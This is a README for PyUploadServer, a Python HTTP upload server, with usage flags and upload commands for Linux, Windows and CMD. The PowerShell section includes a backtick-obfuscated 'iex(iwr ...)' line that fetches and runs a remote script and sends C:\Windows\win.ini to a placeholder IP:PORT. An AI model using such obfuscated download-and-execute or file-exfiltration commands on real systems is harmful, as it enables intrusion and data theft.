## PyUploadServer

Modified from https://github.com/tarunKoyalwar/TempUpServer

## Features

- Works Fine on Both Windows and Linux.
- `localhost/upload` => Upload using Browser
- ['.py,'.ipynb'] are blacklisted can be changed in code.


## Uploading Using CLI

### Linux
- Using Curl
```shell
curl -k http://IP:PORT/ -F file=@FILANME
```

### Windows

Powershell (If SSL is enabled, it fails due to the self-signed certificate.)
```shell
$wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('http://IP:PORT/', "C:\Windows\win.ini")

or

i`e`x(iWr -UsEbaSIcparSING http://IP:PORT/Invoke-Upload.ps1); Invoke-Upload "C:\Windows\win.ini"
```

CMD: Supported on Windows 10 version 1803 and later.
```shell
cmd /c curl -k http://IP:PORT/ -F file=@logo.png
```


### Usage
```
usage: upserver.py [-h] [-i IP] [-p PORT] [-d DIRECTORY] [-ssl] [-bindall] [-cn COMMON_NAME]

A Simple http server to upload for temporary use

options:
  -h, --help            show this help message and exit
  -i IP, --ip IP        IP or network interface
  -p PORT, --port PORT  Port to use avoid using 80,443 for non root user
  -d DIRECTORY, --directory DIRECTORY
                        Working Directory
  -ssl, --ssl           Enable HTTPS
  -bindall, --bindall   Bind on all network interface
  -cn COMMON_NAME, --common-name COMMON_NAME
                        Certificate common name
```

Example:
```
python3 upserver.py -i <IP or Interface> -p <Port> -d <Optional:Folder>
python3 upserver.py -i eth0 -p 8888 -d uploads
python3 upserver.py -i eth0 -p 8888 -d uploads -ssl -bindall
```

## Built With

* [Python3]
